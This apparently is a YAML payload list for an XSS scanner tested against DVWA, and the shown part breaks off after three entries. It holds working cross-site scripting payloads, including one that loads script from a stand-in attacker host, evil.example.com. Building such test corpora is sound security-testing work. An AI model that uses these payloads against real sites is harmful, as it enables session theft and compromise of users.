# XSS payloads — 25 entries (prompt.md §6: XSS ≥25).
# Sources: PayloadsAllTheThings/XSS, OWASP XSS filter evasion cheat-sheet,
# SecLists, Gareth Heyes / PortSwigger polyglot sets, HTML5 security cheat-sheet.
#
# DVWA /vulnerabilities/xss_r/?name=<payload> reflects into
# <pre>Hello <name></pre>, so "reflected" trigger fires if the marker
# round-trips unchanged.

# ---- script-tag (5) ----
- id: xss-script-001
  class: xss
  payload: "<script>alert(1)</script>"
  trigger: { kind: reflected, marker: "<script>alert(1)</script>" }
  cwe: CWE-79
  source: "PayloadsAllTheThings/XSS — baseline"

- id: xss-script-002
  class: xss
  payload: "<script src=//evil.example.com/x.js></script>"
  trigger: { kind: reflected, marker: "<script src" }
  cwe: CWE-79
  source: "OWASP Filter Evasion Cheat Sheet"

- id: xss-script-003
  class: xss
  payload: "<ScRipT>alert(1)</ScRipT>"
